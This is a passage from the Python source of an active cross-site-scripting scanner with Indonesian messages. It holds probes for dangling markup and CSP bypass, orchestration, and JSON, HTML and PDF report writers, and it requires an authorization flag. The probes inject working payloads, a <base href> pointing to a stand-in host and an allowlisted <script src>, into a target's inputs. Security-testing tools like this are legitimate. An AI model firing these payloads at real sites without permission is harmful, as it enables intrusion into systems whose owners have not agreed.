                if not body: continue
                for m in re.finditer(re.escape(marker), body):
                    ctx = _context_at(body, m.start())
                    if ctx.get("in_attr") and ctx.get("in_tag"):
                        s = body.rfind("<", 0, m.start()); e = body.find(">", m.start())
                        tag = body[s:e+1] if s!=-1 and e!=-1 else ""
                        if (("<img" in payload and re.search(r"<img\b", tag, re.I)) or ("<base" in payload and re.search(r"<base\b", tag, re.I))):
                            if self._claim(29, point.key, "dang"):
                                return self._yes(f"Dangling markup ter-refleksi di bawah CSP ketat pada {meta.get('url')} ({meta.get('point')}).", {**meta,"csp":csp[:150]})
        return self._no("Tidak ada dangling markup yang terkonfirmasi.")

    def _lab_30(self):
        # CSP bypass
        csp = self._csp_header
        if not csp: return self._no("Tidak ada header CSP.")
        sources = _csp_script_sources(csp)
        hosts = [s for s in sources if s and not s.startswith("'") and s not in ("data:","blob:","*") and s.strip()]
        directives = _csp_directives(csp)
        # try base-uri bypass if missing
        if "base-uri" not in directives and "default-src" not in directives:
            for point in self._ranked_points()[:6]:
                if not self._lab_budget(): break
                marker = _random_token(); payload = f"<base href='https://satria.invalid/'>{marker}"
                body, meta = self._reflects(point, marker, payload)
                if body and re.search(r"<base\b[^>]+href\s*=\s*['\"]?https?://satria\.invalid", body, re.I):
                    if self._claim(30, point.key, "base"): return self._yes(f"CSP tanpa base-uri: <base> terinjeksi di {meta.get('url')}.", {**meta,"csp":csp[:150]})
        if not hosts: return self._no("CSP tidak memiliki host script allowlist yang dapat dieksploitasi secara langsung.")
        host = hosts[0].strip().replace("https://","").replace("http://","").replace("//","").split("/")[0]
        if not host or host.startswith("'"): return self._no("Host CSP tidak dapat diparse.")
        for point in self._ranked_points()[:10]:
            if not self._lab_budget(): break
            marker = _random_token(); payload = f"<script src='//{host}/s{marker}.js'></script>"
            body, meta = self._reflects(point, marker, payload)
            if body and re.search(r"<script\b[^>]+src\s*=\s*['\"]?(?:https?:)?//"+re.escape(host), body, re.I):
                if self._claim(30, point.key, "host"): return self._yes(f"CSP allowlist ({host}) dapat dilewati: <script src> ter-refleksi di {meta.get('url')}.", {**meta,"csp":csp[:150],"allowed_host":host})
        return self._no("Bypass CSP tidak terkonfirmasi.")

    # ==================== Orchestration ====================
    def _run_one(self, lab_id, fn):
        self._lab_id = lab_id; self._lab_used = 0
        try:
            confirmed, evidence, details = fn()
        except Exception as exc:
            confirmed, evidence, details = False, f"Error pengujian: {type(exc).__name__}: {exc}", {}
            if len(self.stats["errors"]) < 80: self.stats["errors"].append(f"lab {lab_id}: {exc}")
        return bool(confirmed), (evidence or ""), (details or {})

    def _test_all_labs(self) -> None:
        tests = {i: getattr(self, f"_lab_{i:02d}") for i in range(1, 31)}
        for lab_id, title, _key, _severity in CATALOG:
            print(f"[PROGRESS {lab_id}/{len(CATALOG)}] {title}")
            confirmed, evidence, details = self._run_one(lab_id, tests[lab_id])
            self._results[lab_id] = {"confirmed": confirmed, "evidence": evidence, "details": details, "requests": self._lab_used, "rechecked": False}
            status = "[CONFIRMED]" if confirmed else "[not-confirmed]"
            print(f"  {status} {lab_id:02d} {title}")
        # pass 2: tracking ulang satu per satu untuk lab yang belum terkonfirmasi
        for lab_id, title, _key, _severity in CATALOG:
            res = self._results.get(lab_id, {})
            if res.get("confirmed"): continue
            if not self._global_budget() or self._deadline_hit(): break
            self.stats["rechecks"] = self.stats.get("rechecks",0) + 1
            confirmed, evidence, details = self._run_one(lab_id, tests[lab_id])
            if confirmed:
                details = {**(details or {}), "rechecked": True}
                evidence = "Dilacak ulang & terkonfirmasi: " + evidence
                self._results[lab_id].update({"confirmed": True, "evidence": evidence, "details": details, "rechecked": True})
                print(f"  [RECHECK-CONFIRMED] {lab_id:02d} {title}")

    def run(self) -> dict[str, Any]:
        self._crawl()
        self._discover_points()
        self._test_all_labs()
        return self._build_report()

    def _build_report(self) -> dict[str, Any]:
        labs = []
        confirmed_count = 0
        for lab_id, title, key, severity in CATALOG:
            result = self._results.get(lab_id, {"confirmed": False, "evidence": "", "details": {}})
            confirmed = bool(result.get("confirmed"))
            if confirmed: confirmed_count += 1
            det = dict(result.get("details") or {}); det["track"] = getattr(self, "_track", {}).get(lab_id, [])[-30:]; det["rechecked"] = bool(result.get("rechecked"))
            labs.append({"id": lab_id, "title": title, "key": key, "severity": severity,
                         "status": "confirmed" if confirmed else "not_confirmed",
                         "evidence": result.get("evidence",""), "details": det,
                         "requests": result.get("requests", 0)})
        return {
            "scanner": "SATRIA-XSS", "version": __version__, "target": self.target_url,
            "generated_at": datetime.now(timezone.utc).isoformat(), "mode": "active",
            "summary": {"confirmed": confirmed_count, "not_confirmed": len(CATALOG)-confirmed_count, "total": len(CATALOG), "rechecks": self.stats.get("rechecks",0)},
            "labs": labs,
            "scan_stats": {"pages_fetched": self.stats.get("pages_fetched",0), "requests": self.stats.get("requests",0),
                           "points": len(self.points), "external_scripts": len(self._script_srcs),
                           "csp": self._csp_header[:300], "rechecks": self.stats.get("rechecks",0), "errors": self.stats.get("errors",[])},
        }


def scan_target(
    target_url: str,
    *,
    authorized: bool = False,
    allow_private: bool = False,
    max_pages: int = 10,
    max_points: int = 24,
    max_requests: int = 900,
    timeout: float = 8.0,
    time_delay: float = 0.0,
    seed_html: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    scanner = SatriaXSSScanner(
        target_url,
        authorized=authorized,
        allow_private=allow_private,
        max_pages=max_pages,
        max_points=max_points,
        max_requests=max_requests,
        timeout=timeout,
        time_delay=time_delay,
        seed_html=seed_html,
    )
    return scanner.run()


# ===========================================================================
# Adapter kompatibel app.py
# ===========================================================================
def _runtime_bool(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    return str(value).strip().lower() in {"1", "true", "yes", "y", "on"}


def _normalize_runtime_key(raw_key: Any) -> str:
    key = str(raw_key).strip().lower().replace("-", "_")
    while "__" in key:
        key = key.replace("__", "_")
    return key


_RUNTIME_TARGET_MAP: dict[str, str] = {
    "artifacts_dir": "ARTIFACTS_DIR",
    "output_dir": "ARTIFACTS_DIR",
    "work_dir": "ARTIFACTS_DIR",
    "scrape_path": "SCRAPE_PATH",
    "findings_path": "FINDINGS_PATH",
    "output_pdf": "OUTPUT_PDF",
    "pdf_path": "OUTPUT_PDF",
    "pdf": "OUTPUT_PDF",
    "kiosapi_base_url": "KIOSAPI_BASE_URL",
    "kiosapi_key": "KIOSAPI_API_KEY",
    "kiosapi_api_key": "KIOSAPI_API_KEY",
    "censys_token": "CENSYS_TOKEN",
    "nvd_api_key": "NVD_API_KEY",
    "authorized": "ACTIVE_SCAN_AUTHORIZED",
    "active_scan_authorized": "ACTIVE_SCAN_AUTHORIZED",
    "run_active_tools": "RUN_ACTIVE_TOOLS",
    "run_dir_brute": "RUN_DIR_BRUTE",
    "run_censys": "RUN_CENSYS",
    "run_nvd": "RUN_NVD",
    "enable_llm": "ENABLE_LLM",
    "allow_partial_tools": "ALLOW_PARTIAL_TOOLS",
    "scan_deadline_seconds": "SCAN_DEADLINE_SECONDS",
    "deadline_seconds": "SCAN_DEADLINE_SECONDS",
}
_RUNTIME_BOOL_TARGETS = {
    "ACTIVE_SCAN_AUTHORIZED", "RUN_ACTIVE_TOOLS", "RUN_DIR_BRUTE", "RUN_CENSYS",
    "RUN_NVD", "ENABLE_LLM", "ALLOW_PARTIAL_TOOLS",
}


def configure_runtime(*args: Any, **overrides: Any) -> dict[str, Any]:
    """Terima work_dir posisional (app.py) dan keyword runtime."""
    incoming: dict[str, Any] = {}
    for index, arg in enumerate(args):
        if arg is None:
            continue
        if index == 0 and isinstance(arg, (Path, os.PathLike)):
            incoming["ARTIFACTS_DIR"] = arg
            continue
        if index == 0 and isinstance(arg, str) and arg.strip():
            incoming["ARTIFACTS_DIR"] = arg
            continue
        if hasattr(arg, "keys"):
            try:
                incoming.update({str(k): arg[k] for k in arg.keys()})
                continue
            except Exception:
                pass
        if hasattr(arg, "__dict__"):
            incoming.update({str(k): v for k, v in vars(arg).items()})
    incoming.update(overrides)

    applied: dict[str, Any] = {}
    ignored: list[str] = []
    for raw_key, value in incoming.items():
        key = _normalize_runtime_key(raw_key)
        target = _RUNTIME_TARGET_MAP.get(key)
        if target is None:
            ignored.append(str(raw_key))
            continue
        if target in _RUNTIME_BOOL_TARGETS:
            new_value: Any = _runtime_bool(value)
        elif target == "ARTIFACTS_DIR":
            new_value = Path(str(value)).expanduser()
        elif target == "SCAN_DEADLINE_SECONDS":
            try:
                new_value = float(value)
            except (TypeError, ValueError):
                new_value = globals().get("SCAN_DEADLINE_SECONDS", 600.0)
        else:
            new_value = value
        globals()[target] = new_value
        applied[target] = new_value
        _RUNTIME_CONFIG[target] = new_value

    artifacts = globals().get("ARTIFACTS_DIR")
    if isinstance(artifacts, Path):
        globals()["SCRAPE_PATH"] = str(artifacts / "scrape_result.json")
        globals()["FINDINGS_PATH"] = str(artifacts / "findings.json")
        if "OUTPUT_PDF" not in applied:
            globals()["OUTPUT_PDF"] = str(artifacts / "satria_report.pdf")

    config = get_runtime_config()
    config["_ignored"] = ignored
    return config


def get_runtime_config() -> dict[str, Any]:
    return {name: globals().get(name) for name in _RUNTIME_TARGET_MAP.values()}


def _load_kiosapi_api_key() -> str:
    return str(globals().get("KIOSAPI_API_KEY") or os.getenv("KIOSAPI_API_KEY") or "")


def persist_scrape_artifacts(scrape: dict[str, Any]) -> dict[str, Path]:
    data = scrape.get("data", scrape) if isinstance(scrape, dict) else {}
    if not isinstance(data, dict):
        data = {}
    html_text = data.get("html") or data.get("html-llm") or ""
    markdown_text = data.get("markdown") or data.get("markdown-llm") or ""
    if not str(html_text).strip():
        raise RuntimeError("Scraper tidak mengembalikan HTML. Tidak membuat laporan tanpa bukti HTML.")
    meta = scrape.get("meta", {}) if isinstance(scrape.get("meta"), dict) else {}
    url = meta.get("url") or (scrape.get("url") if isinstance(scrape, dict) else None) or "unknown"
    artifacts_dir = Path(globals().get("ARTIFACTS_DIR") or Path("artifacts")).expanduser()
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    slug = _slugify(str(url))
    html_path = artifacts_dir / ("scrape_" + slug + ".html")
    md_path = artifacts_dir / ("scrape_" + slug + ".md")
    meta_path = artifacts_dir / ("scrape_" + slug + ".meta.json")
    html_path.write_text(str(html_text), encoding="utf-8")
    md_path.write_text(str(markdown_text), encoding="utf-8")
    meta_path.write_text(json.dumps({
        "url": str(url),
        "meta": meta,
        "saved_at": datetime.now(timezone.utc).isoformat(),
        "html_chars": len(str(html_text)),
        "markdown_chars": len(str(markdown_text)),
        "html_sha256": hashlib.sha256(str(html_text).encode("utf-8", "ignore")).hexdigest(),
    }, indent=2, ensure_ascii=False), encoding="utf-8")
    return {"html": html_path, "markdown": md_path, "meta": meta_path}


# ===========================================================================
# PDF: reportlab (berwarna + tabel) dengan fallback multi-halaman
# ===========================================================================
def _summary_from_report(report: dict[str, Any]) -> dict[str, Any]:
    labs = report.get("labs", []) if isinstance(report, dict) else []
    confirmed = [item for item in labs if isinstance(item, dict) and item.get("status") == "confirmed"]
    not_confirmed = [item for item in labs if isinstance(item, dict) and item.get("status") != "confirmed"]
    by_severity: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for item in confirmed:
        severity = str(item.get("severity", "info")).lower()
        by_severity[severity if severity in by_severity else "info"] += 1
    return {
        "confirmed": len(confirmed),
        "not_confirmed": len(not_confirmed),
        "total": len(labs),
        "confirmed_manual": len(confirmed),
        "candidates_total": len(not_confirmed),
        "observations_total": 0,
        "by_severity": by_severity,
        "triage_by_severity": dict(by_severity),
        "triage_total": len(confirmed),
    }


def _pdf_lab_items(result: dict[str, Any]) -> list[dict[str, Any]]:
    report = result.get("report", {}) if isinstance(result.get("report"), dict) else {}
    labs = report.get("labs") or result.get("labs") or []
    return [item for item in labs if isinstance(item, dict)]


# Warna
_BLUE = (0.043, 0.239, 0.569)
_MID_BLUE = (0.082, 0.396, 0.752)
_WHITE = (1.0, 1.0, 1.0)
_DARK = (0.13, 0.16, 0.20)
_GREY = (0.48, 0.53, 0.58)
_GREEN_TINT = (0.894, 0.957, 0.894)
_STRIPE = (0.965, 0.973, 0.988)


def _pdf_escape_text(text: str) -> str:
    return (str(text).replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
            .replace("\r", " ").replace("\n", " "))


def _pdf_text(x: float, y: float, size: float, text: str, color: tuple[float, float, float],
              bold: bool = False) -> str:
    r, g, b = color
    font = "F2" if bold else "F1"
    return ("BT /" + font + " " + str(size) + " Tf "
            + str(round(r, 3)) + " " + str(round(g, 3)) + " " + str(round(b, 3)) + " rg "
            "1 0 0 1 " + str(round(x, 2)) + " " + str(round(y, 2)) + " Tm ("
            + _pdf_escape_text(text) + ") Tj ET\n")


def _pdf_rect(x: float, y: float, w: float, h: float, color: tuple[float, float, float]) -> str:
    r, g, b = color
    return ("q " + str(round(r, 3)) + " " + str(round(g, 3)) + " " + str(round(b, 3)) + " rg "
            + str(round(x, 2)) + " " + str(round(y, 2)) + " " + str(round(w, 2)) + " "
            + str(round(h, 2)) + " re f Q\n")


def _assemble_pdf(pages: list[str]) -> bytes:
    count = len(pages)
    page_ids = [5 + index * 2 for index in range(count)]
    content_ids = [6 + index * 2 for index in range(count)]
    objects: list[bytes] = []
    objects.append(b"<< /Type /Catalog /Pages 2 0 R >>")
    kids = " ".join(str(pid) + " 0 R" for pid in page_ids)
    objects.append(("<< /Type /Pages /Kids [" + kids + "] /Count " + str(count) + " >>").encode())
    objects.append(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>")
    objects.append(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>")
    for index, content in enumerate(pages):
        data = content.encode("latin-1", "replace")
        objects.append(("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] "
                        "/Resources << /Font << /F1 3 0 R /F2 4 0 R >> >> "
                        "/Contents " + str(content_ids[index]) + " 0 R >>").encode())
        objects.append(("<< /Length " + str(len(data)) + " >>\nstream\n").encode() + data + b"\nendstream")

    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets: list[int] = []
    for number, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += (str(number) + " 0 obj\n").encode() + body + b"\nendobj\n"
    xref = len(out)
    out += ("xref\n0 " + str(len(objects) + 1) + "\n").encode() + b"0000000000 65535 f \n"
    for offset in offsets:
        out += (("%010d 00000 n \n") % offset).encode()
    out += ("trailer\n<< /Size " + str(len(objects) + 1) + " /Root 1 0 R >>\nstartxref\n"
            + str(xref) + "\n%%EOF\n").encode()
    return bytes(out)


def _render_pdf_fallback(pdf_path: Path, target: str, generated: str,
                         summary: dict[str, Any], labs: list[dict[str, Any]]) -> None:
    """PDF multi-halaman berwarna dengan tabel; SEMUA 30 baris dimasukkan."""
    pages: list[str] = []
    state = {"y": 0.0}

    def start_page(first: bool) -> None:
        content: list[str] = []
        content.append(_pdf_rect(36, 782, 523, 34, _BLUE))
        content.append(_pdf_text(44, 800, 12.5, "SATRIA XSS - Laporan Pemindaian 30 Vektor", _WHITE, bold=True))
        content.append(_pdf_text(44, 787, 7.2, "Cross-Site Scripting assessment (evidence-based)", _WHITE))
        content.append(_pdf_text(40, 766, 7.5, "Target: " + target[:118], _DARK))
        content.append(_pdf_text(40, 755, 7.5, "Digenerate: " + generated[:118], _DARK))
        if first:
            confirmed = summary.get("confirmed_manual", summary.get("confirmed", 0))
            candidates = summary.get("candidates_total", summary.get("not_confirmed", 0))
            content.append(_pdf_rect(40, 731, 515, 16, _STRIPE))
            content.append(_pdf_text(44, 736, 7.6,
                                     "Terkonfirmasi: " + str(confirmed)
                                     + "   |   Kandidat/belum terkonfirmasi: " + str(candidates)
                                     + "   |   Total vektor: 30", _DARK, bold=True))
            top = 716
        else:
            top = 736
        content.append(_pdf_rect(40, top - 14, 515, 14, _MID_BLUE))
        content.append(_pdf_text(44, top - 10, 7, "ID", _WHITE, bold=True))
        content.append(_pdf_text(70, top - 10, 7, "VEKTOR XSS", _WHITE, bold=True))
        content.append(_pdf_text(270, top - 10, 7, "SEV", _WHITE, bold=True))
        content.append(_pdf_text(316, top - 10, 7, "STATUS", _WHITE, bold=True))
        content.append(_pdf_text(392, top - 10, 7, "BUKTI / CATATAN", _WHITE, bold=True))
        pages.append("".join(content))
        state["y"] = top - 20

    start_page(True)
    for index, lab in enumerate(labs):
        confirmed = str(lab.get("status", "")) == "confirmed"
        title_lines = textwrap.wrap(str(lab.get("title", "")), 56) or [""]
        evidence_lines = textwrap.wrap(str(lab.get("evidence", "")) or "-", 50) or ["-"]
        title_lines = title_lines[:4]
        evidence_lines = evidence_lines[:5]
        line_count = max(len(title_lines), len(evidence_lines))
        height = line_count * 9 + 5
        if state["y"] - height < 48:
            start_page(False)
        content = pages[-1]
        top = state["y"]
        background = _GREEN_TINT if confirmed else (_STRIPE if index % 2 else _WHITE)
        content_parts = [_pdf_rect(40, top - height + 2, 515, height, background)]
        content_parts.append(_pdf_text(44, top - 8, 7, str(lab.get("id", "")), _DARK, bold=True))
        for line_index, line in enumerate(title_lines):
            content_parts.append(_pdf_text(70, top - 8 - line_index * 9, 6.8, line, _DARK))
        severity = str(lab.get("severity", "")).upper()
        severity_color = (0.72, 0.11, 0.11) if severity == "CRITICAL" else (
            (0.90, 0.32, 0.0) if severity == "HIGH" else _DARK)
        content_parts.append(_pdf_text(270, top - 8, 6.5, severity[:7], severity_color, bold=True))
        content_parts.append(_pdf_text(316, top - 8, 6.5,
                                       "CONFIRMED" if confirmed else "NOT CONFIRMED",
                                       (0.10, 0.36, 0.12) if confirmed else _GREY,
                                       bold=confirmed))
        for line_index, line in enumerate(evidence_lines):
            content_parts.append(_pdf_text(392, top - 8 - line_index * 9, 6.2, line, _DARK))
        pages[-1] = content + "".join(content_parts)
        state["y"] = top - height

    total = len(pages)
    for number, content in enumerate(pages, start=1):
        footer = _pdf_text(40, 26, 6.5,
                           "SATRIA XSS v" + __version__ + "  |  halaman " + str(number) + "/" + str(total)
                           + "  |  gunakan hanya pada aset berizin", _GREY)
        pages[number - 1] = content + footer

    pdf_path.write_bytes(_assemble_pdf(pages))


def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
    pdf_path = Path(path or str(globals().get("OUTPUT_PDF") or OUTPUT_PDF)).expanduser()
    if not pdf_path.is_absolute():
        pdf_path = (Path.cwd() / pdf_path).resolve()
    pdf_path.parent.mkdir(parents=True, exist_ok=True)

    report = result.get("report", {}) if isinstance(result.get("report"), dict) else {}
    source = report if report else result
    summary = result.get("summary") if isinstance(result.get("summary"), dict) else _summary_from_report(source)
    labs = _pdf_lab_items(result)
    # Pastikan selalu ada 30 baris (lengkapi dari katalog bila data kurang).
    by_id = {int(item.get("id", 0)): item for item in labs if str(item.get("id", "")).isdigit()}
    labs = [by_id.get(lab_id, {
        "id": lab_id, "title": title, "severity": severity,
        "status": "not_confirmed", "evidence": "Tidak ada data.",
    }) for lab_id, title, _key, severity in CATALOG]

    target = str(result.get("target") or source.get("target") or "-")
    generated = str(result.get("generated_at") or source.get("generated_at") or "")
    if "T" in generated:
        generated = generated.replace("T", " ").split(".")[0]

    produced = False
    try:
        from reportlab.lib import colors
        from reportlab.lib.enums import TA_CENTER
        from reportlab.lib.pagesizes import A4
        from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
        from reportlab.lib.units import cm
        from reportlab.platypus import Paragraph, SimpleDocTemplate, Spacer, Table, TableStyle

        document = SimpleDocTemplate(str(pdf_path), pagesize=A4, leftMargin=1.4 * cm,
                                     rightMargin=1.4 * cm, topMargin=1.3 * cm, bottomMargin=1.3 * cm)
        styles = getSampleStyleSheet()
        title_style = ParagraphStyle("T", parent=styles["Title"], textColor=colors.HexColor("#0b3d91"),
                                     fontSize=17, alignment=TA_CENTER)
        sub_style = ParagraphStyle("S", parent=styles["Normal"], alignment=TA_CENTER,
                                   fontSize=8.5, textColor=colors.HexColor("#444444"))
        head_style = ParagraphStyle("H", parent=styles["Heading2"], textColor=colors.HexColor("#0b3d91"),
                                    fontSize=11.5, spaceBefore=8, spaceAfter=4)
        cell_style = ParagraphStyle("C", parent=styles["Normal"], fontSize=7.2, leading=9)

        story: list[Any] = [
            Paragraph("SATRIA XSS &mdash; Laporan Pemindaian 30 Vektor", title_style),
            Paragraph("Target: " + html_module.escape(target) + "<br/>Digenerate: "
                      + html_module.escape(generated) + " | Cakupan: 30 vektor XSS", sub_style),
            Spacer(1, 8),
            Paragraph("Ringkasan Hasil", head_style),
        ]
        severity_map = summary.get("by_severity") or {}
        summary_rows = [["Metrik", "Nilai"],
                        ["Terkonfirmasi", str(summary.get("confirmed_manual", summary.get("confirmed", 0)))],
                        ["Kandidat / belum terkonfirmasi", str(summary.get("candidates_total", 0))],
                        ["Total vektor", "30"],
                        ["Critical", str(severity_map.get("critical", 0))],
                        ["High", str(severity_map.get("high", 0))],
                        ["Medium", str(severity_map.get("medium", 0))],
                        ["Low", str(severity_map.get("low", 0))],
                        ["Info", str(severity_map.get("info", 0))]]
        summary_table = Table(summary_rows, colWidths=[5.2 * cm, 11.2 * cm])
        summary_table.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#0b3d91")),
            ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
            ("BACKGROUND", (0, 1), (0, -1), colors.HexColor("#e8f0fe")),
            ("FONTNAME", (0, 1), (0, -1), "Helvetica-Bold"),
            ("FONTSIZE", (0, 0), (-1, -1), 8),
            ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#9bb3d1")),
            ("PADDING", (0, 0), (-1, -1), 4),
        ]))
        story.append(summary_table)
        story.append(Paragraph("Detail 30 Vektor XSS", head_style))

        rows: list[list[Any]] = [["ID", "Vektor", "Sev", "Status", "Bukti / catatan"]]
        for lab in labs:
            rows.append([
                str(lab.get("id", "")),
                Paragraph(html_module.escape(str(lab.get("title", ""))), cell_style),
                str(lab.get("severity", "")).upper(),
                "CONFIRMED" if lab.get("status") == "confirmed" else "NOT CONFIRMED",
                Paragraph(html_module.escape(str(lab.get("evidence", "")) or "-"), cell_style),
            ])
        detail_table = Table(rows, colWidths=[0.9 * cm, 5.6 * cm, 1.4 * cm, 2.3 * cm, 6.2 * cm],
                             repeatRows=1, splitByRow=1)
        table_style = [
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#1565c0")),
            ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
            ("FONTSIZE", (0, 0), (-1, -1), 7),
            ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#b0bec5")),
            ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ("PADDING", (0, 0), (-1, -1), 3),
        ]
        for row_index, lab in enumerate(labs, start=1):
            if lab.get("status") == "confirmed":
                table_style.append(("BACKGROUND", (0, row_index), (-1, row_index), colors.HexColor("#e8f5e9")))
                table_style.append(("TEXTCOLOR", (3, row_index), (3, row_index), colors.HexColor("#1b5e20")))
            elif row_index % 2 == 0:
                table_style.append(("BACKGROUND", (0, row_index), (-1, row_index), colors.HexColor("#fafafa")))
        detail_table.setStyle(TableStyle(table_style))
        story.append(detail_table)
        story.append(Spacer(1, 8))
        story.append(Paragraph(
            "<b>Catatan:</b> 'confirmed' berarti bukti kontekstual terdeteksi (payload ter-refleksi pada konteks "
            "berbahaya, atau bukti sink/sumber DOM yang jelas, atau kontrol blokir + bypass yang berhasil). "
            "'not_confirmed' berarti bukti tidak cukup - bukan klaim aman. Validasi manual tetap diperlukan.",
            ParagraphStyle("N", parent=styles["Normal"], fontSize=7.2, leading=9, textColor=colors.HexColor("#333333"))))
        document.build(story)
        produced = True
    except Exception:
        produced = False

    if not produced:
        _render_pdf_fallback(pdf_path, target, generated, summary, labs)

    data = pdf_path.read_bytes() if pdf_path.exists() else b""
    if not data.startswith(b"%PDF") or len(data) < 1000:
        _render_pdf_fallback(pdf_path, target, generated, summary, labs)
    return pdf_path


def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
    output_dir.mkdir(parents=True, exist_ok=True)
    json_path = output_dir / "satria_xss_report.json"
    html_path = output_dir / "satria_xss_report.html"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")
    rows = []
    for item in report.get("labs", []):
        rows.append("<tr><td>" + str(item.get("id")) + "</td><td>"
                    + html_module.escape(str(item.get("title", ""))) + "</td><td>"
                    + html_module.escape(str(item.get("severity", ""))) + "</td><td>"
                    + html_module.escape(str(item.get("status", ""))) + "</td><td>"
                    + html_module.escape(str(item.get("evidence", ""))[:400]) + "</td></tr>")
    html = ("<html><head><meta charset='utf-8'><title>SATRIA XSS Report</title></head><body>"
            "<h2>SATRIA XSS Report</h2><p>Target: "
            + html_module.escape(str(report.get("target", "")))
            + "</p><table border='1' cellpadding='4' cellspacing='0'>"
            "<tr><th>ID</th><th>Vektor</th><th>Severity</th><th>Status</th><th>Bukti</th></tr>"
            + "".join(rows) + "</table></body></html>")
    html_path.write_text(html, encoding="utf-8")
    return json_path, html_path


def _scrape_url(scrape_data: dict[str, Any] | None) -> str | None:
    if not isinstance(scrape_data, dict):
        return None
    meta = scrape_data.get("meta") if isinstance(scrape_data.get("meta"), dict) else {}
    for candidate in (meta.get("url"), scrape_data.get("url"),
                      scrape_data.get("target"), scrape_data.get("target_url")):
        if isinstance(candidate, str) and candidate.strip():
            return candidate.strip()
    return None


def _scrape_html(scrape_data: dict[str, Any] | None) -> str | None:
    if not isinstance(scrape_data, dict):
        return None
    data = scrape_data.get("data") if isinstance(scrape_data.get("data"), dict) else scrape_data
    for key in ("html", "html-llm"):
        value = data.get(key) if isinstance(data, dict) else None
        if isinstance(value, str) and value.strip():
            return value
    return None


def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None = None,
                 html: str | None = None, authorized: bool | None = None,
                 http_result: dict[str, Any] | None = None,
                 allow_partial_tools: bool | None = None,
                 enable_llm: bool | None = None, run_censys: bool | None = None,
                 run_nvd: bool | None = None, **runtime_options: Any) -> dict[str, Any]:
    overrides: dict[str, Any] = dict(runtime_options)
    for name, value in (("allow_partial_tools", allow_partial_tools),
                        ("enable_llm", enable_llm), ("run_censys", run_censys),
                        ("run_nvd", run_nvd), ("authorized", authorized)):
        if value is not None:
            overrides[name] = value
    if overrides:
        configure_runtime(**overrides)

    permitted = authorized if authorized is not None else bool(globals().get("ACTIVE_SCAN_AUTHORIZED"))
    if not permitted:
        raise RuntimeError("Pemindaian aktif memerlukan authorized=True (otorisasi wajib diberikan).")

    target_url = url or _scrape_url(scrape_data) or ""
    if not target_url:
        raise RuntimeError("URL target tidak ditemukan pada scrape_data/url.")

    if scrape_data is not None and _scrape_html(scrape_data):
        try:
            persist_scrape_artifacts(scrape_data)
        except Exception:
            pass

    report = scan_target(
        target_url,
        authorized=True,
        allow_private=False,
        seed_html=html or _scrape_html(scrape_data),
    )
    summary = _summary_from_report(report)
    result: dict[str, Any] = {
        "target": report.get("target", target_url),
        "generated_at": report.get("generated_at"),
        "mode": "active",
        "labs": report.get("labs", []),
        "report": report,
        "summary": summary,
        "sections": {"http": [], "code": [], "portswigger": []},
        "errors": report.get("scan_stats", {}).get("errors", []),
    }

    try:
        findings_path = Path(globals().get("FINDINGS_PATH")
                             or Path(globals().get("ARTIFACTS_DIR", Path("artifacts"))) / "findings.json").expanduser()
        if not findings_path.is_absolute():
            findings_path = (Path.cwd() / findings_path).resolve()
        findings_path.parent.mkdir(parents=True, exist_ok=True)
        findings_path.write_text(json.dumps(result, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception as exc:
        result.setdefault("errors", []).append("findings.json: " + str(exc))

    pdf_path = render_pdf(result, str(globals().get("OUTPUT_PDF") or "artifacts/laporan_kerentanan.pdf"))
    globals()["OUTPUT_PDF"] = str(pdf_path)
    return result


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="SATRIA XSS - pemindai 30 vektor XSS")
    parser.add_argument("target", help="URL target HTTP/HTTPS")
    parser.add_argument("--authorized", action="store_true", help="Wajib: Anda memiliki izin pengujian.")
    parser.add_argument("--allow-private", action="store_true", help="Izinkan target lokal/privat.")
    parser.add_argument("--max-pages", type=int, default=10)
    parser.add_argument("--max-points", type=int, default=24)
    parser.add_argument("--max-requests", type=int, default=900)
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--output-dir", default="satria_xss_report")
    args = parser.parse_args(argv)
    if not args.authorized:
        parser.error("Pengujian aktif memerlukan --authorized.")
    try:
        report = scan_target(
            args.target, authorized=True, allow_private=args.allow_private,
            max_pages=args.max_pages, max_points=args.max_points,
            max_requests=args.max_requests, timeout=args.timeout,
        )
    except Exception as exc:
        print("[error] " + type(exc).__name__ + ": " + str(exc), file=sys.stderr)
        return 1
    json_path, html_path = write_report(report, Path(args.output_dir))
    summary = report.get("summary", {})
    print("SATRIA XSS selesai: " + str(summary.get("confirmed", 0)) + "/30 vektor terkonfirmasi.")
    print("JSON: " + str(json_path))
    print("HTML: " + str(html_path))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
